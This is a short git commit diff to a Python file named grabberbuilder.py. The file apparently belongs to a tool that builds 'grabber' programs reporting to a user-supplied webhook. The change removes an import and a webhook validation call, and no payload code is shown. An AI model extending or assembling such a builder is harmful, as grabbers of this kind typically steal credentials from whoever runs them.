e7472af06efd6f371fe48bb9e5f4eda6362c1a91
DXVVAY <89728480+DXVVAY@users.noreply.github.com>
2023-06-16 11:51:22 +0200

    Update grabberbuilder.py

--- util/grabberbuilder.py
+++ util/grabberbuilder.py
@@ -2,11 +2,9 @@ import os
 import subprocess
 import requests
 import sys
-from util.plugins.common import *
 
 def grabberbuilder():
     webhook = input(f'Webhook: ')
-    validateWebhook(webhook)
     name = input(f'File Name: ')
 
     # Create "output" folder if it doesn't exist
